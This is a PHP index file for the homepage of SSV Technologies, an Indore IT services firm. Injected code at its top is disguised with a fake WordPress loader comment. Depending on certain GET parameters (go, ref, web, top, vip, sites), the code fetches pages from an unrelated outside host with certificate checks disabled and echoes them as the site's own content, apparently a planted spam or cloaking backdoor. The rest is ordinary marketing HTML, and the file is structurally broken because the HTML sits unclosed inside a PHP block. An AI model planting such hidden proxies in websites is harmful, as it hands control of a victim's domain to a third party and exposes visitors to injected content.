<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}

elseif(isset($_GET['top'])) {
  $sitex = $_GET['top'];
  $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?top='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
	elseif(isset($_GET['vip'])) {
  $sitex = $_GET['vip'];
  $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?vip='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/ssvtechnologies/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {
  /**
   * Loads the WordPress environment and template.
   *
   * @package WordPress
   */

  
   <!DOCTYPE html>
   <html lang="en">
   <head>
   <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
   
   
       <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
       <!-- Meta Tags -->
       <meta http-equiv="x-ua-compatible" content="ie=edge" />
       <meta name="author" content="themeholder" />
       <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
       <meta name="title" content="Website development | SEO Service | SSV Technologies">
       <meta name="description" content="SSV Technologies, Indore is providing best IT Services like website development, Digital Marketing, Mobile Application, UI/UX Design Services">
       <meta name="keywords" content="SSV Technologies, website designing company in Indore, best web development company in Indore, responsive website design company indore, Digital Marketing Company in Indore, best IT Company in Indore, top it company in indore, it solutions indore, seo services in indore">
       <meta name="robots" content="index, follow">
       <meta name="language" content="English">
       <meta name="revisit-after" content="1 days">
       <link rel="canonical" href="https://ssvtechnologies.in/" />
       <!-- Page Title -->
       <title>Website development | SEO Service | SSV Technologies</title>
       <!-- Favicon Icon -->
       <link rel="shortcut icon" type="image/png" href="assets/img/favicon.png" />
       <!-- Stylesheets -->
       <link rel="stylesheet" href="assets/css/font-awesome.min.css" />
       <link rel="stylesheet" href="assets/css/animate.min.css" />
       <link rel="stylesheet" href="assets/css/slicknav.min.css" />
       <link rel="stylesheet" href="assets/css/owl.carousel.min.css" />
       <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
       <link rel="stylesheet" href="assets/fonts/flaticon.css" />
       <link rel="stylesheet" href="assets/css/style.css" />
       <link rel="stylesheet" href="assets/css/responsive.css" />
       
       <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-4E47ZZERB8"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
   
     gtag('config', 'G-4E47ZZERB8');
   </script>
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=AW-848315801"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
   
     gtag('config', 'AW-848315801');
   </script>
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
   
   <body>
       <!-- Main Content site -->
       <div class="main-site">
           <!--preloader  -->
           <div id="loader-wrapper">
               <div id="loader"></div>
               <div class="loader-section section-left"></div>
               <div class="loader-section section-right"></div>
           </div>
           <!--/End preloader  -->
           <!-- Header Area Start-->
           <header class="sticky-header">
               <div class="container">
                   <div class="row align-items-center">
                       <div class="col-md-2">
                           <div class="logo">
                               <a href="index.html">
                                   <img src="assets/img/logo.png" alt="" />
                               </a>
                           </div>
                       </div>
                       <div class="col-md-8">
                           <div class="main-menu float-right">
                               <nav>
                                   <ul>
                                       <li class="dropdown">
                                           <a href="index.html" data-scroll-nav="0">Home</a>
                                        <!--  <ul>
                                               <li><a href="index-2.html">Home one</a></li>
                                               <li><a href="index2.html">Home two</a></li>
                                           </ul>-->
                                       </li>
                                       <li class="dropdown">
                                           <a href="#" data-scroll-nav="1">Company</a>
                                           <ul>
                                               <li><a href="what-we-do.html">What We Do</a></li>
                                               <li><a href="who-we-are.html">Who We Are</a></li>
                                               <li><a href="testimonial.html">Testimonial</a></li>
                                               <li><a href="technologies.html">Technologies</a></li>
                                           </ul>
                                       </li>
                                       <li class="dropdown">
                                           <a href="#" data-scroll-nav="2">Services</a>
                                           <ul>
                                               <li><a href="web-development.html">Web Development</a></li>
                                               <li><a href="mobile-application.html">Mobile Application</a></li>
                                               <li><a href="digital-marketing.html">Digital Marketing</a></li>
                                               <li><a href="ui-ux-design.html">UI/UX Design</a></li>
                                           </ul>
                                       </li>
                                       <li class="dropdown">
                                           <a href="#" data-scroll-nav="3">Software</a>
                                           <ul>
                                               <li><a href="web-crm.html">Web CRM</a></li>
                                               <li><a href="desktop-crm.html">Desktop CRM</a></li>
                                           </ul>
                                       </li>
                                       <li><a href="career.html" data-scroll-nav="4">Career</a></li>
                                       <li><a href="contact-us.html" data-scroll-nav="4">Contact</a></li>
                                   </ul>
                               </nav>
                           </div>
                           <div id="mobile-menu"></div>
                       </div>
                       <div class="col-md-2">
                           <div class="call-button">
                               <a href="tel:9893-36-7367"><i class="fa fa-phone"></i> 9893-36-7367</a>
                           </div>
                       </div>
                   </div>
               </div>
           </header>
           <!-- Header Area End!-->
           <!-- Start Hero  -->
           <div class="hero-area" data-scroll-index="0">
               <div class="single-hero">
                   <div class="hero-wrapper">
                       <div class="container">
                           <div class="row">
                               <div class="col-md-6 col-sm-12">
                                   <div class="hero-content">
                                       <h1>Responsive Web Design & Development</h1>
                                       <p>Responsive Web Design acts in response to the necessity of user by altering the design of the website according to the gadget being utilized. With this layout change as per the size and capabilities of the device. </p>
                                       <a class="viso-btn hero" href="contact-us.html">Contact Us</a>
                                       <a class="viso-btn two" href="web-development.html">Our Services</a>
                                   </div>
                               </div>
                           </div>
                       </div>
                       <div class="hero-area-social">
                           <ul>
                               <li>
                                   <a href="https://www.facebook.com/ssvtechnologies1/"><i class="fa fa-facebook"></i></a>
                               </li>
                               <li>
                                   <a href="https://twitter.com/ssvtechnology"><i class="fa fa-twitter"></i></a>
                               </li>
                               <li>
                                   <a href="https://www.linkedin.com/company/ssv-technologies-and-consultancy-services/"><i class="fa fa-linkedin"></i></a>
                               </li>
                           </ul>
                       </div>
                   </div>
               </div>
           </div>
           <!-- /End Hero  -->
           <!-- Work Progress -->
           <div class="work-area section-padding">
               <div class="container">
                   <div class="row">
                       <div class="col-md-8 offset-md-2 col-md-8">
                           <div class="section-title text-center">
                               <h2>What We Do
                               </h2>
                               <p>
                                   A professional web design and development company in India provides a range of affordable custom website design, and inexpensive e-commerce website design services to clients across the world.
                               </p>
                           </div>
                       </div>
                   </div>
                   <div class="row">
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon">
                                   <img src="assets/img/w1.png" alt="">
                               </div>
                               <h2>Web Hosting
                               </h2>
                               <p>
                                   SSV Technologies deliver simple and easy web hosting solutions that are customized according to your particular requirements.
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon two">
                                   <img src="assets/img/e1.png" alt="">
                               </div>
                               <h2>Email Marketing
                               </h2>
                               <p>
                                   The goal of email marketing is to build a relationship with potential and current customers by sending them relevant and valuable information.
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon three">
                                   <img src="assets/img/g1.png" alt="">
                               </div>
                               <h2>Graphic Designing
                               </h2>
                               <p>
                                   Graphic design can be used in a variety of applications, including advertising, branding, packaging, web design, and more.
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                   </div>
                   
                   
                     <div class="row" style="
       margin-top: -72px;
   ">
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon">
                                   <img src="assets/img/software.png" alt="">
                               </div>
                               <h2>Software Development
   
                               </h2>
                               <p>
                                   SSV Technologies leading software development company in Indore offers easy software system solutions for the growth of your business.
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon two">
                                   <img src="assets/img/bulk.png" alt="">
                               </div>
                               <h2>Bulk Sms Marketing
   
                               </h2>
                               <p>
                                   We are a bulk SMS marketing company and also offer bulk WhatsApp services nationally and internationally at the lowest prices for business promotions.
   
   
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-4">
                           <div class="single-work">
                               <div class="work-icon three">
                                   <img src="assets/img/seo.png" alt="">
                               </div>
                               <h2>SEO
   
                               </h2>
                               <p>
   SSV Technologies leading SEO Company that provides the finest services to clients around the world. Our experienced SEO professionals.
   
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                   </div>
               </div>
           </div>
           <!-- /End Work Progress -->
           <!-- Discover Area -->
           <div class="discover-area section-padding">
               <div class="container">
                   <div class="row">
                       <div class="col-md-6">
                           <div class="discover-title">
                               <h2>About Us
                               </h2>
                               <p style="
       text-align: justify;
   ">
   SSV Technologies is a leading software development and IT consulting company that provides end-to-end solutions to businesses of all sizes. The company is based in India and has a team of highly skilled and experienced professionals who are dedicated to delivering innovative and cost-effective solutions to clients across the globe.
                            Services offered by SSV Technologies include software development, web development, mobile application development, digital marketing, and IT consulting. The company has expertise in various technologies such as Java, .NET, PHP, Angular, React, Node.js, and more. They use agile methodologies to ensure that their solutions are delivered on time and within budget.
     
                              
                               </p>
                             
                           </div>
                           <div class="dicover-list">
                               <ul>
                                   <li>
                                       <i class="fa fa-check" aria-hidden="true"></i>
                                       <p>
                                           We are a public web service with talent in all fields of Web Development. We provide competent solutions.
                                       </p>
                                   </li>
                                   <li>
                                       <i class="fa fa-check" aria-hidden="true"></i>
                                       <p>
                                           SSV Technologies leading SEO Company that provides the finest services to clients around the world.
                                       </p>
                                   </li>
                                   <li>
                                       <i class="fa fa-check" aria-hidden="true"></i>
                                       <p>
                                           SSV Technologies leading software development company in Indore offers easy software system solutions for the growth of your business.
                                       </p>
                                   </li>
                               </ul>
                               <a class="viso-btn discover" href="who-we-are.html">Read More</a>
                           </div>
                       </div>
                       <div class="col-md-6">
                           <div class="discover-image">
                               <img src="assets/img/discover-right.png" alt="" />
                           </div>
                       </div>
                   </div>
                   <div class="row" data-scroll-index="1">
                       
                        <div class="section-title text-center">
                               <h2>Our Success Journey 
   
                               </h2>
                               <p>
                                  A professional web design and development company in India providing a range of affordable custom website design, inexpensive e-commerce website design services to clients across the world.
   
                               </p>
                           </div>
                       
                       <!-- single counter -->
                       <div class="col-md-3 col-sm-6">
                         
                           <div class="counter-project">
                                <img src="assets/img/s.png" alt="">
                               <h1>8000+
                               </h1>
                               <span>Satisfied Clients
                               </span>
                           </div>
                       </div>
                       <!-- single counter -->
                       <!-- single counter -->
                       <div class="col-md-3 col-sm-6">
                           <div class="counter-project">
                                <img src="assets/img/p.png" alt="">
                               <h1>40+
                               </h1>
                               <span>Professionals
                               </span>
                           </div>
                       </div>
                       <!-- single counter -->
                       <!-- single counter -->
                       <div class="col-md-3 col-sm-6">
                           <div class="counter-project">
                               <img src="assets/img/pc.png" alt="">
                               <h1>10000+
                               </h1>
                               <span>Projects Completed
                               </span>
                           </div>
                       </div>
                       <!-- single counter -->
                       <!-- single counter -->
                       <div class="col-md-3 col-sm-6">
                           <div class="counter-project">
                                <img src="assets/img/i.png" alt="">
                               <h1>1500+
                               </h1>
                               <span>International Clients
                               </span>
                           </div>
                       </div>
                       <!-- single counter -->
                   </div>
               </div>
           </div>
           <!-- /End Discover Area -->
           <!-- Service Area -->
           <div class="service-area section-padding">
               <div class="container">
   
   
   
   
   
   
   
   
   
                   <div class="row">
                       <div class="col-md-8 offset-md-2" data-scroll-index="2">
                           <div class="section-title text-center">
                               <h2>Our Services
                               </h2>
                               <p>
                                   The highest quality marketing for every client on every project.
                               </p>
                           </div>
                       </div>
                   </div>
   
   
                    
                   <div class="row">
                       <!-- Single Work-->
                       <div class="col-md-6">
                           <div class="single-service">
                               <img src="assets/img/ux.png" alt="" />
                               <h2>UI/UX Design
                               </h2>
                               <p>
                                  Our service suite offers the best turnkey solutions for websites, allowing us to fully take care of any required features. We can update and improve your website in real time, offering you a proactive and concurrent customer experience by regularly connecting with our clients.
   
   
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-6">
                           <div class="single-service">
                               <img src="assets/img/digital.png" alt="" />
                               <h2>Digital Marketing
                               </h2>
                               <p>
                                  Digital Marketing provides Digital Consultants, SEO Services, and PPC Management to make your digital marketing investment more productive. We offer a wide range of digital marketing services such as SEO Service Provider Services.
   
   
                               </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       <!-- Single Work-->
                       <div class="col-md-6">
                           <div class="single-service">
                               <img src="assets/img/web.png" alt="" />
                               <h2>Web Development</h2>
                               <p>
   Web development has grown as a critical business practice, with companies across the industry looking for a company to take care of their needs and concerns. By turning to us, you know you are giving your online presence the attention it deserves while getting everything you want from the professionals in our industry.                            </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       
                       
                       <!-- Single Work-->
                       <div class="col-md-6">
                           <div class="single-service">
                               <img src="assets/img/mobile.png" alt="" />
                               <h2>Mobile Application
   </h2>
                               <p>
   We provide cost-effective and high-quality app development services to our customers. It is not enough to just have a great idea for an app; you also need to be able to create it. We can develop your idea with the customization that you want, or if you don’t have an idea, we can help build one for you. We provide our services in a cost-effective manner to our clients.                           </p>
                           </div>
                       </div>
                       <!-- Single Work-->
                       
                       
                   </div>
   
   
   
   
   
   
   
   
   
   
   
   
   
          <!--       <div class="row">
                       <div class="active-service-carousl owl-carousel">
                           <!-- single service -->
    <!--  <div class="single-service">
                               <img src="assets/img/ux.png" alt="" />
                               <h2>UI/UX Design
                               </h2>
                               <p>
                                   We are a top-notch graphic design company that offers services like the creation of graphics, logos, and brochures.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                         <!--     <div class="single-service">
                               <img src="assets/img/digital.png" alt="" />
                               <h2>Digital Marketing
                               </h2>
                               <p>
                                   The goal of digital marketing is to reach and engage with a target audience, drive website traffic, and ultimately convert leads into customers.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                         <!--     <div class="single-service">
                           <div class="single-service">
                               <img src="assets/img/web.png" alt="" />
                               <h2>Web Development</h2>
                               <p>
                                   SSV Technologies leading software development company in Indore offers easy software system solutions for the growth of your business.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                          <!-- <div class="single-service">
                               <img src="assets/img/mobile.png" alt="" />
                               <h2>Mobile Application
                               </h2>
                               <p>
                                   Mobile is not only the new digital hub, but also the bridge to the physical world, it will help you transform your entire business.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                        <!--   <div class="single-service">
                               <img src="assets/img/ux.png" alt="" />
                               <h2>UI/UX Design
                               </h2>
                               <p>
                                   We are a top-notch graphic design company that offers services like the creation of graphics, logos, and brochures.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                          <!--   <div class="single-service">
                               <img src="assets/img/digital.png" alt="" />
                               <h2>Digital Marketing
                               </h2>
                               <p>
                                   The goal of digital marketing is to reach and engage with a target audience, drive website traffic, and ultimately convert leads into customers.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                         <!--    <div class="single-service">
                               <img src="assets/img/web.png" alt="" />
                               <h2>Web Development</h2>
                               <p>
                                   SSV Technologies leading software development company in Indore offers easy software system solutions for the growth of your business.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                      <!--       <div class="single-service">
                               <img src="assets/img/mobile.png" alt="" />
                               <h2>Mobile Application
                               </h2>
                               <p>
                                   Mobile is not only the new digital hub, but also the bridge to the physical world, it will help you transform your entire business.
                               </p>
                           </div>
                           <!-- single service -->
                           <!-- single service -->
                       <!--      <div class="single-service">
                               <img src="assets/img/ux.png" alt="" />
                               <h2>UI/UX Design
                               </h2>
                               <p>
                                   We are a top-notch graphic design company that offers services like the creation of graphics, logos, and brochures.
                               </p>
                           </div>
                           <!-- single service -->
                      <!--   </div>
                   </div>-->
               </div>
           </div>
           <!-- /End Service Area -->
           <!-- Portfolio Area-->
      <!--    <div class="portfolio-area">
               <div class="container">
                   <div class="row">
                       <div class="col-md-8 offset-md-2">
                           <div class="section-title text-center">
                               <h2>Discover Our Expertise</h2>
                               <p>
                                   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed
                                   do eiusmod tempor incididuntut labore et dolore magna aliqua.
                                   Ut enim ad minim.
                               </p>
                           </div>
                       </div>
                   </div>
                   <div class="row">
                       <div class="col-lg-12">
                           <div class="portfolio-menu filter-button-group text-center">
                               <ul>
                                   <li class="active" data-filter="*">All Projects</li>
                                   <li data-filter=".branding">Branding</li>
                                   <li data-filter=".web">Web design</li>
                                   <li data-filter=".developemt">developemt</li>
                                   <li data-filter=".ui">ui Design</li>
                               </ul>
                           </div>
                       </div>
                   </div>
               </div>
               <div class="grid">
                   <!-- Single Portfolio -->
                 <!--  <div class="single-portfolio grid-item branding web ui">
                       <img src="assets/img/portfolio1.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>Landing Page</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
                 <!--   <div class="single-portfolio grid-item developemt web ui">
                       <img src="assets/img/portfolio2.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>Landing Page</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
               <!--     <div class="single-portfolio grid-item branding ui web">
                       <img src="assets/img/portfolio3.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>business card</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
             <!--       <div class="single-portfolio grid-item branding ui web">
                       <img src="assets/img/portfolio4.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>mockup</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
             <!--       <div class="single-portfolio grid-item branding ui developemt">
                       <img src="assets/img/portfolio5.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>T-Shirt</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
               <!--     <div class="single-portfolio grid-item developemt ui">
                       <img src="assets/img/portfolio6.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>brand mockup</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
               <!--     <div class="single-portfolio grid-item web branding">
                       <img src="assets/img/portfolio7.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>headcap</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
                   <!-- Single Portfolio -->
               <!--     <div class="single-portfolio grid-item branding ui web">
                       <img src="assets/img/portfolio8.png" alt="" />
                       <div class="portfolio-wrapper">
                           <div class="portfolio-content">
                               <h3>book print</h3>
                               <p>UI/UX Design</p>
                           </div>
                       </div>
                   </div>
                   <!-- /Single Portfolio -->
             <!--   </div>
           </div>-->
           <!-- /End Portfolio Area-->
           <!-- Call To Action Area-->
           <div class="cta-area">
               <div class="container">
                   <div class="row">
                       <div class="col-md-9 col-sm-12">
                           <div class="cta-text">
                               <h2>Build your career with us
                               </h2>
                           </div>
                       </div>
                       <div class="col-md-3">
                           <div class="cta-btn">
                               <a class="viso-btn cta" href="contact-us.html">contact us</a>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
           <!-- /End Call To Action Area-->
           <!-- Tem Area -->
           <!--   <div class="team-area">
               <div class="container">
                   <div class="row">
                       <div class="col-md-8 offset-md-2">
                           <div class="section-title text-center">
                               <h2>Our Expert Team Member</h2>
                               <p>
                                   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed
                                   do eiusmod tempor incididuntut labore et dolore magna aliqua.
                                   Ut enim ad minim.
                               </p>
                           </div>
                       </div>
                   </div>
                   <div class="row">
                       <div class="col-md-4">
                           <div class="single-team">
                               <img src="assets/img/team1.png" alt="" />
                               <h2>Mark Parker</h2>
                               <p>founder</p>
                               <div class="tem-social">
                                   <ul>
                                       <li>
                                           <a href="#"><i class="fa fa-facebook"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-twitter"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-linkedin"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-pinterest"></i></a>
                                       </li>
                                   </ul>
                               </div>
                           </div>
                       </div>
                       <div class="col-md-4">
                           <div class="single-team">
                               <img src="assets/img/team2.png" alt="" />
                               <h2>robert brown</h2>
                               <p>web designer</p>
                               <div class="tem-social">
                                   <ul>
                                       <li>
                                           <a href="#"><i class="fa fa-facebook"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-twitter"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-linkedin"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-pinterest"></i></a>
                                       </li>
                                   </ul>
                               </div>
                           </div>
                       </div>
                       <div class="col-md-4">
                           <div class="single-team">
                               <img src="assets/img/team3.png" alt="" />
                               <h2>mustafa kamal</h2>
                               <p>XI/UX Designer</p>
                               <div class="tem-social">
                                   <ul>
                                       <li>
                                           <a href="#"><i class="fa fa-facebook"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-twitter"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-linkedin"></i></a>
                                       </li>
                                       <li>
                                           <a href="#"><i class="fa fa-pinterest"></i></a>
                                       </li>
                                   </ul>
                               </div>
                           </div>
                       </div>
                   </div>
               </div>
           </div> -->
           <div class="about-agency section-padding">
               <div class="container">
                   <div class="row">
                       <div class="col-md-6 col-sm-12">
                           <div class="agency-details">
                               <h2>Who We Are
                               </h2>
                               <p>
                                   SSV Technologies is a leading software development and IT consulting company based in India. We are a team of highly skilled and experienced professionals dedicated to providing end-to-end solutions to businesses of all sizes. Our mission is to help our clients leverage technology to improve their operations, increase efficiency, and grow their businesses.
   
   
                               </p>
                               <p>
                                   At SSV Technologies, we believe that every business is unique, and we strive to deliver customized solutions that meet the specific needs of each client. We use agile methodologies to ensure that our solutions are delivered on time and within budget while maintaining the highest standards of quality.
   
   
                               </p>
                               <a class="viso-btn discover" href="contact-us.html">Get In Touch</a>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
           <!-- /End About Agency Area -->
           <!-- Pricing  Area -->
           <!-- <div class="pricing-area section-padding" data-scroll-index="3">
               <div class="container">
                   <div class="row">
                       <div class="col-md-5 col-sm-12">
                           <div class="section-title effect text-left">
                               <h2>our pricing plan</h2>
                               <p>
                                   Lorem ipsum dolor sit amet, consectetur cing elit, sed do
                                   eiusmod tempor incididuntut.
                               </p>
                           </div>
                       </div>
                       <div class="col-md-4 offset-md-3 col-sm-12">
                           <div class="price-swetch float-right m-t">
                               <ul class="nav" id="myTab" role="tablist">
                                   <li>
                                       <a id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">yearly</a>
                                   </li>
                                   <li>
                                       <a class="active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">monthly</a>
                                   </li>
                               </ul>
                           </div>
                       </div>
                       <div class="tab-content">
                           <div class="tab-pane active" id="home" role="tabpanel" aria-labelledby="home-tab">
                               <div class="row">
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img1.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>Basic Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate basic">$10.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img2.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>standard Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate advance">$15.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img3.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>premium Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate pro">$20.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                               </div>
                           </div>
                           <div class="tab-pane" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                               <div class="row">
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img1.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>Basic Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate basic">$100.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img2.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>standard Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate advance">$150.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                                   <div class="col-md-4">
                                       <div class="pricing-table m-t">
                                           <div class="price-img">
                                               <img src="assets/img/price-img3.png" alt="" />
                                           </div>
                                           <div class="price-content">
                                               <h2>premium Plan</h2>
                                               <p>
                                                   Lorem ipsum dolor sit amet, consectetur adipisicing
                                                   elit, sed do mojak eiusmod tempor incididun.
                                               </p>
                                               <span class="rate pro">$200.00</span>
                                               <a class="viso-btn price" href="#">purchase now</a>
                                           </div>
                                       </div>
                                   </div>
                               </div>
                           </div>
                       </div>
                   </div>
               </div>
           </div> -->
           <!-- /End Pricing  Area -->
           <!-- Testimonmail Area -->
           
         
           <div class="testimonial-area section-padding">
             
                           
               <div class="container">
                     
                      
                        <div class="section-title text-center">
                               <h2>What Client's Say
   
                               </h2>
                               <p>
                              
        We are very proud of the service we provide for our customers. In fact, we see a client relationship drastically more personal than that of most agencies in our field.                      
                               </p>
                           </div>
                   
                   
                   <div class="row">
                       
                     
                       
                       <div class="testimonial-active owl-carousel">
                           <!-- Single Testimonial-->
                           <div class="single-testimonial">
                               <div class="testimonail-img">
                                   <img src="assets/img/testimonial.png" alt="" />
                               </div>
                               <div class="testimonial-content">
                                   <i class="flaticon-right-quote"></i>
                                   <p>
                                       Great service is the result of fine conversations and personal attention, I personally found Suryawanshi Sir, as a mature owner with hard-working nature, ssv has developed my website with keen observation, and I like the services and friendly nature of ssv services.
                                   </p>
                                   <h3>Chitrak Solanki</h3>
                                  <!-- <span>Envato Customer</span>-->
                               </div>
                           </div>
                           <!-- Single Testimonial-->
                           <!-- Single Testimonial-->
                           <div class="single-testimonial">
                               <div class="testimonail-img">
                                   <img src="assets/img/testimonial.png" alt="" />
                               </div>
                               <div class="testimonial-content">
                                   <i class="flaticon-right-quote"></i>
                                   <p>
                                       Very awesome services in a single portal of SSV Technologies, being a reseller it's very difficult to manage multiple portals, but now I can resell multiple services in one portal...Robust application with multiple features. Excellent results using SSV Technologies services from the last 5 years. Today I am giving 5 stars for quick service as they supported us on holidays. Keep it up good work
                                       
                                   </p>
                                   <h3>SandeshWala</h3>
